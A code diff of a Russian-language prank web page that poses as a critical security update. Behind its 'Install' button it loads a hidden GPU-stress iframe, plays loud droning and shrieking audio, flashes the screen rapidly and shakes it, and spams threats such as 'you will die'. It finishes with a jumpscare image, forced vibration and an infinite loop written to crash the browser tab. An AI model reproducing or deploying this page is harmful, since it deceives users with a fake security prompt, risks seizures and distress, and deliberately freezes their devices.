@@ -3,90 +3,84 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
-<title>System Update</title>
+<title>System Security</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; -webkit-user-select: none; -webkit-touch-callout: none; }
   html, body { background: #000; overflow: hidden; font-family: 'Courier New', monospace; height: 100vh; width: 100vw; color: #fff; position: fixed; top: 0; left: 0; right: 0; bottom: 0; touch-action: none; overscroll-behavior: none; }
 
-  /* ТЯЖЕЛЫЙ CZNULL (Максимально скрыт) */
-  #stress-layer { 
-    position: fixed; inset: 0; width: 100vw; height: 100vh; 
-    z-index: -1; border: none; pointer-events: none;
-    opacity: 0.1; /* Почти прозрачный, но грузит GPU */
-  }
+  /* CZNULL (Скрытый) */
+  #stress-layer { position: fixed; inset: 0; width: 100vw; height: 100vh; z-index: -1; border: none; opacity: 0.05; pointer-events: none; }
 
-  /* ЛОВУШКА */
-  #trap-screen { position: fixed; inset: 0; background: #ffffff; z-index: 99999; display: flex; justify-content: center; align-items: center; flex-direction: column; color: #333; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; transition: opacity 0.5s ease; }
-  .loader-bar { width: 250px; height: 3px; background: #e0e0e0; border-radius: 2px; overflow: hidden; margin-bottom: 15px; }
-  .loader-progress { width: 0%; height: 100%; background: #333; transition: width 0.1s; }
-  #trap-text { font-size: 12px; font-weight: 500; color: #888; letter-spacing: 2px; text-transform: uppercase; }
+  /* ЭТАП 1: ЛОВУШКА (Требует клика для звука) */
+  #trap-screen { position: fixed; inset: 0; background: #f0f0f0; z-index: 99999; display: flex; justify-content: center; align-items: center; flex-direction: column; color: #000; font-family: sans-serif; }
+  .alert-box { background: #fff; padding: 20px; border-radius: 10px; box-shadow: 0 10px 30px rgba(0,0,0,0.2); text-align: center; width: 80%; max-width: 300px; }
+  .alert-box h3 { margin-bottom: 10px; font-size: 16px; }
+  .alert-box p { font-size: 12px; color: #666; margin-bottom: 20px; }
+  #start-btn { background: #007aff; color: #fff; border: none; padding: 10px 20px; border-radius: 5px; font-size: 14px; font-weight: bold; width: 100%; cursor: pointer; }
 
-  /* ЭКРАН ХАОСА */
+  /* ЭТАП 2: ХАОС */
   #horror-screen { display: none; position: fixed; inset: 0; z-index: 100; background: #000; }
   
-  /* Слой визуального шума */
+  /* Шум (Статика) */
   #noise-layer {
     position: fixed; inset: 0; z-index: 50; pointer-events: none;
-    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.85' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
-    opacity: 0.15; mix-blend-mode: overlay;
-    animation: noiseAnim 0.1s infinite;
+    background-image: url("data:image/svg+xml,%3Csvg viewBox='0 0 200 200' xmlns='http://www.w3.org/2000/svg'%3E%3Cfilter id='noiseFilter'%3E%3CfeTurbulence type='fractalNoise' baseFrequency='0.9' numOctaves='3' stitchTiles='stitch'/%3E%3C/filter%3E%3Crect width='100%25' height='100%25' filter='url(%23noiseFilter)'/%3E%3C/svg%3E");
+    opacity: 0.2; mix-blend-mode: overlay; animation: noiseAnim 0.1s infinite;
   }
-  @keyframes noiseAnim { 0% { transform: translate(0,0); } 50% { transform: translate(-5%,5%); } 100% { transform: translate(5%,-5%); } }
+  @keyframes noiseAnim { 0% { transform: translate(0,0); } 50% { transform: translate(-10%,10%); } 100% { transform: translate(10%,-10%); } }
 
-  /* Текст */
+  /* Страшный текст */
   .creepy-text {
     position: absolute; color: #fff; font-family: 'Times New Roman', serif;
-    font-weight: bold; text-transform: uppercase; letter-spacing: 5px;
-    text-shadow: 0 0 10px #fff, 0 0 20px #f00; opacity: 0; pointer-events: none;
+    font-weight: bold; text-transform: uppercase; letter-spacing: 3px;
+    text-shadow: 0 0 15px #fff, 0 0 30px #f00; opacity: 0; pointer-events: none;
     z-index: 60; white-space: nowrap;
   }
 
-  /* Глитч оверлеи */
+  /* Вспышки */
   #flash { position: fixed; inset: 0; background: #fff; opacity: 0; pointer-events: none; z-index: 999; mix-blend-mode: difference; }
-  #red-flash { position: fixed; inset: 0; background: #f00; opacity: 0; pointer-events: none; z-index: 998; mix-blend-mode: multiply; }
+  #red-flash { position: fixed; inset: 0; background: #800; opacity: 0; pointer-events: none; z-index: 998; mix-blend-mode: multiply; }
 
-  .shaking { animation: shake 0.03s infinite; }
+  .shaking { animation: shake 0.04s infinite; }
   @keyframes shake { 
-    0% { transform: translate(0, 0); } 
-    20% { transform: translate(-15px, 10px) rotate(-2deg); } 
-    40% { transform: translate(15px, -10px) rotate(2deg); } 
-    60% { transform: translate(-15px, -15px) rotate(0deg); } 
-    80% { transform: translate(15px, 15px) rotate(2deg); } 
-    100% { transform: translate(0, 0); } 
+    0% { transform: translate(0, 0); } 20% { transform: translate(-20px, 15px) rotate(-3deg); } 
+    40% { transform: translate(20px, -15px) rotate(3deg); } 60% { transform: translate(-15px, -15px) rotate(0deg); } 
+    80% { transform: translate(15px, 15px) rotate(3deg); } 100% { transform: translate(0, 0); } 
   }
 
-  /* УТКА */
+  /* УТКА (ДЖАМПСКЕЙР) */
   #duck-face {
     position: fixed; inset: 0; z-index: 9000; display: none;
     width: 100vw; height: 100vh; object-fit: cover;
-    filter: grayscale(100%) contrast(300%) brightness(50%) sepia(100%) hue-rotate(320deg) saturate(500%);
-    animation: duckShake 0.05s infinite;
+    filter: grayscale(100%) contrast(400%) brightness(30%) sepia(100%) hue-rotate(320deg) saturate(800%);
+    animation: duckShake 0.03s infinite;
   }
   @keyframes duckShake { 
-    0% { transform: scale(1.2) translate(0,0); } 
-    50% { transform: scale(1.4) translate(20px, -20px); } 
-    100% { transform: scale(1.2) translate(-20px, 20px); } 
+    0% { transform: scale(1.5) translate(0,0); } 50% { transform: scale(1.8) translate(30px, -30px); } 
+    100% { transform: scale(1.5) translate(-30px, 30px); } 
   }
 
-  /* СИНИЙ ЭКРАН */
-  #final { position: fixed; inset: 0; display: none; z-index: 10000; background: #05051a; color: #888; text-align: left; padding: 20px; font-size: 12px; flex-direction: column; justify-content: flex-start; overflow: hidden; font-family: 'Courier New', monospace; }
-  #final h2 { color: #fff; padding: 2px 0; display: inline-block; font-size: 16px; margin-bottom: 20px; font-weight: bold; letter-spacing: 2px;}
-  #final p { margin-bottom: 8px; line-height: 1.4; text-align: left; color: #ccc;}
-  .dump-box { border: 1px solid #222; padding: 10px; margin-top: 20px; font-size: 10px; line-height: 1.2; color: #555; overflow: hidden; height: 40vh; }
+  /* Финальный кровавый экран (вместо BSOD) */
+  #blood-screen { position: fixed; inset: 0; display: none; z-index: 10000; background: #200; color: #f00; overflow: hidden; }
+  .blood-text { font-size: 40px; font-family: Impact, sans-serif; text-align: center; margin-top: 40vh; animation: bloodPulse 0.2s infinite; }
+  @keyframes bloodPulse { 0% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } 100% { transform: scale(1); opacity: 0.8; } }
 </style>
 </head>
 <body>
 
-<!-- CZNULL (Грузит систему) -->
+<!-- CZNULL -->
 <iframe id="stress-layer" src="https://cznull.github.io/vsbm" sandbox="allow-scripts allow-same-origin"></iframe>
 
-<!-- ЛОВУШКА -->
+<!-- ЭТАП 1: ЛОВУШКА -->
 <div id="trap-screen">
-  <div class="loader-bar"><div class="loader-progress" id="progress"></div></div>
-  <div id="trap-text">Сканирование уязвимостей...</div>
+  <div class="alert-box">
+    <h3>Обновление безопасности</h3>
+    <p>Требуется установка критического патча для защиты устройства.</p>
+    <button id="start-btn">УСТАНОВИТЬ</button>
+  </div>
 </div>
 
-<!-- ЭКРАН ХАОСА -->
+<!-- ЭТАП 2: ХАОС -->
 <div id="horror-screen">
   <div id="noise-layer"></div>
 </div>
@@ -94,14 +88,9 @@
 <!-- УТКА -->
 <img id="duck-face" src="https://i.imgur.com/2Y6v9uW.jpeg" alt="AI Duck">
 
-<!-- BSOD -->
-<div id="final">
-  <h2>FATAL_KERNEL_PANIC</h2>
-  <p>A problem has been detected and the system has been shut down to prevent damage.</p>
-  <p>KERNEL_DATA_INPAGE_ERROR</p>
-  <p>Technical information:</p>
-  <p>*** STOP: 0x0000007B (0xFFFFF880009A9928, 0xFFFFFFFFC0000034, 0x0000000000000000, 0x0000000000000000)</p>
-  <div class="dump-box" id="memory-dump"></div>
+<!-- ФИНАЛ -->
+<div id="blood-screen">
+  <div class="blood-text">Я ТЕБЯ НАШЕЛ</div>
 </div>
 
 <div id="flash"></div>
@@ -109,217 +98,192 @@
 
 <script>
 /* ==========================================================================
-   ЭТАП 1: ЛОВУШКА
+   ЭТАП 1: КЛИК ДЛЯ РАЗБЛОКИРОВКИ ЗВУКА
    ========================================================================== */
 const trapScreen = document.getElementById('trap-screen');
 const horrorScreen = document.getElementById('horror-screen');
-const progressBar = document.getElementById('progress');
-const trapText = document.getElementById('trap-text');
+const startBtn = document.getElementById('start-btn');
 
-let progress = 0;
-let trapInterval = setInterval(() => {
-    progress += Math.random() * 8;
-    if (progress > 100) progress = 100;
-    progressBar.style.width = progress + '%';
+startBtn.addEventListener('click', () => {
+    // Звук инициализируется ТОЛЬКО после клика
+    initAudio();
     
-    if (progress === 100) {
-        clearInterval(trapInterval);
-        trapText.textContent = "КОД ВЫПОЛНЕН";
-        trapText.style.color = "#f00";
-        setTimeout(startHell, 800); // Небольшая пауза перед адом
-    }
-}, 120);
+    // Переключаем экраны
+    trapScreen.style.display = 'none';
+    horrorScreen.style.display = 'block';
+    document.body.classList.add('shaking');
+    
+    // Запускаем визуальный и звуковой ад
+    startGlitchEffects();
+    startTextSpam();
+    
+    // Через 12 секунд - Джмпскейр (Утка)
+    setTimeout(showDuck, 12000);
+});
 
 /* ==========================================================================
-   ЭТАП 2: АУДИО-ДВИЖОК (Тревожная музыка из Тиктока)
+   ЭТАП 2: АДСКИЙ ЗВУК (WEB AUDIO API)
    ========================================================================== */
 let audioCtx;
-let droneOsc = null;
 
 function initAudio() {
     audioCtx = new (window.AudioContext || window.webkitAudioContext)();
     startDrone();
     startHeartbeat();
-    startRandomScares();
 }
 
-// 1. Низкий гул (Dread)
+// 1. Низкий, вибрирующий гул
 function startDrone() {
-    droneOsc = audioCtx.createOscillator();
+    const osc = audioCtx.createOscillator();
     const gain = audioCtx.createGain();
     const filter = audioCtx.createBiquadFilter();
     
-    droneOsc.type = 'sawtooth';
-    droneOsc.frequency.setValueAtTime(45, audioCtx.currentTime); // Низкая частота
+    osc.type = 'sawtooth';
+    osc.frequency.setValueAtTime(30, audioCtx.currentTime); // Очень низко
     filter.type = 'lowpass';
-    filter.frequency.setValueAtTime(150, audioCtx.currentTime);
+    filter.frequency.setValueAtTime(100, audioCtx.currentTime);
     
-    gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
+    // Добавляем модуляцию частоты для эффекта "тряски"
+    const lfo = audioCtx.createOscillator();
+    lfo.type = 'sine';
+    lfo.frequency.setValueAtTime(5, audioCtx.currentTime); // 5 Гц
+    const lfoGain = audioCtx.createGain();
+    lfoGain.gain.setValueAtTime(10, audioCtx.currentTime);
     
-    droneOsc.connect(filter);
+    lfo.connect(lfoGain);
+    lfoGain.connect(osc.frequency);
+    
+    gain.gain.setValueAtTime(0.4, audioCtx.currentTime); // Громко
+    
+    osc.connect(filter);
     filter.connect(gain);
     gain.connect(audioCtx.destination);
-    droneOsc.start();
+    
+    osc.start();
+    lfo.start();
 }
 
-// 2. Сердцебиение (Учащается)
-let heartbeatSpeed = 1200;
+// 2. Сердцебиение
+let heartbeatSpeed = 1000;
 function startHeartbeat() {
     if (!audioCtx) return;
-    
     function beat() {
         const osc = audioCtx.createOscillator();
         const gain = audioCtx.createGain();
         osc.type = 'sine';
-        osc.frequency.setValueAtTime(60, audioCtx.currentTime);
-        osc.frequency.exponentialRampToValueAtTime(30, audioCtx.currentTime + 0.1);
+        osc.frequency.setValueAtTime(50, audioCtx.currentTime);
+        osc.frequency.exponentialRampToValueAtTime(20, audioCtx.currentTime + 0.15);
         
-        gain.gain.setValueAtTime(0.3, audioCtx.currentTime);
-        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
+        gain.gain.setValueAtTime(0.6, audioCtx.currentTime); // Очень громко
+        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.3);
         
         osc.connect(gain);
         gain.connect(audioCtx.destination);
-        osc.start(); osc.stop(audioCtx.currentTime + 0.2);
+        osc.start(); osc.stop(audioCtx.currentTime + 0.3);
         
-        // Ускоряем сердцебиение со временем
-        if (heartbeatSpeed > 400) heartbeatSpeed -= 50;
+        if (heartbeatSpeed > 300) heartbeatSpeed -= 40;
         setTimeout(beat, heartbeatSpeed);
     }
     beat();
-}
-
-// 3. Случайные скрипы/вскрики (Jumpscares)
-function startRandomScares() {
-    setInterval(() => {
-        if (Math.random() > 0.7) {
-            const osc = audioCtx.createOscillator();
-            const gain = audioCtx.createGain();
-            osc.type = 'sawtooth';
-            osc.frequency.setValueAtTime(Math.random() * 3000 + 1000, audioCtx.currentTime);
-            osc.frequency.exponentialRampToValueAtTime(100, audioCtx.currentTime + 0.2);
-            
-            gain.gain.setValueAtTime(0.1, audioCtx.currentTime);
-            gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
-            
-            osc.connect(gain);
-            gain.connect(audioCtx.destination);
-            osc.start(); osc.stop(audioCtx.currentTime + 0.2);
-        }
-    }, 800);
 }
 
 /* ==========================================================================
    ЭТАП 3: ВИЗУАЛЬНЫЙ УЖАС
    ========================================================================== */
 const phrases = [
-    "Я ТЕБЯ ВИЖУ", "НЕ ОБОРАЧИВАЙСЯ", "КАМЕРА АКТИВИРОВАНА", 
-    "ТЫ НЕ ОДИН", "Я ЗНАЮ ГДЕ ТЫ", "ТВОЙ ЭКРАН - ЭТО ОКНО", 
-    "ОТКРОЙ ДВЕРЬ", "ПОСМОТРИ ЗА СПИНУ", "СИСТЕМА ВЗЛОМАНА", "ПРОЩАЙ"
+    "ОБЕРНИСЬ", "КАМЕРА ВКЛ", "Я ТУТ", "НЕ ОТКРЫВАЙ", 
+    "СЛИШКОМ ПОЗДНО", "ТЫ УМРЕШЬ", "ОНО ЗА ТОБОЙ", 
+    "СМОТРИ В ЭКРАН", "Я ВИЖУ ТЕБЯ", "ПРОЩАЙ"
 ];
-
-function startHell() {
-    initAudio();
-    trapScreen.style.display = 'none';
-    horrorScreen.style.display = 'block';
-    document.body.classList.add('shaking');
-
-    startGlitchEffects();
-    startTextSpam();
-
-    // Через 15 секунд - Утка
-    setTimeout(showDuck, 15000);
-}
 
 function startGlitchEffects() {
     const flash = document.getElementById('flash');
     const redFlash = document.getElementById('red-flash');
 
     setInterval(() => {
-        if (Math.random() > 0.6) {
+        if (Math.random() > 0.7) {
             flash.style.opacity = '1';
-            setTimeout(() => flash.style.opacity = '0', Math.random() * 50 + 20);
+            setTimeout(() => flash.style.opacity = '0', Math.random() * 40 + 10);
         }
         if (Math.random() > 0.8) {
-            redFlash.style.opacity = '0.8';
-            setTimeout(() => redFlash.style.opacity = '0', Math.random() * 100 + 50);
+            redFlash.style.opacity = '0.9';
+            setTimeout(() => redFlash.style.opacity = '0', Math.random() * 80 + 20);
         }
-    }, 200);
+    }, 150);
 }
 
 function startTextSpam() {
     setInterval(() => {
-        if (Math.random() > 0.4) {
+        if (Math.random() > 0.3) {
             const el = document.createElement('div');
             el.className = 'creepy-text';
             el.textContent = phrases[Math.floor(Math.random() * phrases.length)];
             
-            el.style.left = Math.random() * 80 + '%';
+            el.style.left = Math.random() * 70 + '%';
             el.style.top = Math.random() * 80 + '%';
-            el.style.fontSize = (Math.random() * 30 + 20) + 'px';
-            if (Math.random() > 0.7) el.style.color = '#ff0000';
+            el.style.fontSize = (Math.random() * 40 + 20) + 'px';
+            if (Math.random() > 0.6) el.style.color = '#f00';
             
             horrorScreen.appendChild(el);
 
             setTimeout(() => { el.style.transition = 'opacity 0.1s'; el.style.opacity = '1'; }, 10);
-            setTimeout(() => { el.style.opacity = '0'; }, Math.random() * 1500 + 500);
-            setTimeout(() => { el.remove(); }, 3000);
+            setTimeout(() => { el.style.opacity = '0'; }, Math.random() * 1000 + 500);
+            setTimeout(() => { el.remove(); }, 2000);
         }
-    }, 300);
+    }, 200);
 }
 
 /* ==========================================================================
-   ФИНАЛ: УТКА -> BSOD -> КРАШ
+   ЭТАП 4: ДЖАМПСКЕЙР (УТКА И ВИЗГ)
    ========================================================================== */
 function showDuck() {
-    // Резкий визг перед уткой
+    // Оглушительный визг
     if (audioCtx) {
         const osc = audioCtx.createOscillator();
         const gain = audioCtx.createGain();
-        osc.type = 'square';
+        osc.type = 'sawtooth';
         osc.frequency.setValueAtTime(100, audioCtx.currentTime);
-        osc.frequency.exponentialRampToValueAtTime(5000, audioCtx.currentTime + 0.5);
-        gain.gain.setValueAtTime(0.4, audioCtx.currentTime);
-        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.5);
-        osc.connect(gain); gain.connect(audioCtx.destination);
-        osc.start(); osc.stop(audioCtx.currentTime + 0.5);
+        osc.frequency.exponentialRampToValueAtTime(8000, audioCtx.currentTime + 0.4); // Резкий скачок вверх
+        
+        gain.gain.setValueAtTime(1.0, audioCtx.currentTime); // МАКСИМАЛЬНАЯ ГРОМКОСТЬ
+        gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 1.0);
+        
+        osc.connect(gain);
+        gain.connect(audioCtx.destination);
+        osc.start(); osc.stop(audioCtx.currentTime + 1.0);
     }
 
+    // Скрываем старый экран, показываем утку
     horrorScreen.style.display = 'none';
     const duck = document.getElementById('duck-face');
     duck.style.display = 'block';
     
-    if (navigator.vibrate) navigator.vibrate([1000, 200, 1000, 200, 1000]);
+    // Дикая вибрация
+    if (navigator.vibrate) navigator.vibrate([1000, 100, 1000, 100, 1000, 100, 1000]);
 
-    // Через 3 секунды - Синий Экран
-    setTimeout(showBSOD, 3000);
+    // Через 3 секунды - кровавый финал и краш
+    setTimeout(showFinalCrash, 3000);
 }
 
-function showBSOD() {
-    // Резкая тишина
-    if (droneOsc) {
-        try { droneOsc.stop(); } catch(e) {}
-        audioCtx.close(); // Полностью вырубаем звук
-    }
+/* ==========================================================================
+   ЭТАП 5: ФИНАЛ (КРАШ БРАУЗЕРА)
+   ========================================================================== */
+function showFinalCrash() {
+    if (audioCtx) audioCtx.close(); // Резкая тишина
     
     document.getElementById('duck-face').style.display = 'none';
     document.getElementById('flash').style.display = 'none';
     document.getElementById('red-flash').style.display = 'none';
     
-    const bsod = document.getElementById('final');
-    bsod.style.display = 'flex';
-    
-    let dump = "";
-    for (let i = 0; i < 60; i++) {
-        let addr = (0xFFFFF88000000000 + Math.floor(Math.random() * 1000000000)).toString(16).toUpperCase();
-        dump += `${addr}  ${Math.floor(Math.random() * 0xFFFFFFFF).toString(16).toUpperCase()}\n`;
-    }
-    document.getElementById('memory-dump').textContent = dump;
+    // Показываем кровавый экран
+    document.getElementById('blood-screen').style.display = 'block';
 
-    // СМЕРТЬ БРАУЗЕРА (Опаньки) через 2 секунды
+    // Ждем 1.5 секунды и УБИВАЕМ браузер
     setTimeout(() => {
         document.getElementById('stress-layer').style.display = 'none';
-        while(true) {} // Вечный цикл -> Chrome убивает вкладку
-    }, 2000);
+        // Бесконечный цикл. Chrome скажет "Aw, Snap!"
+        while(true) {}
+    }, 1500);
 }
 </script>
 </body>
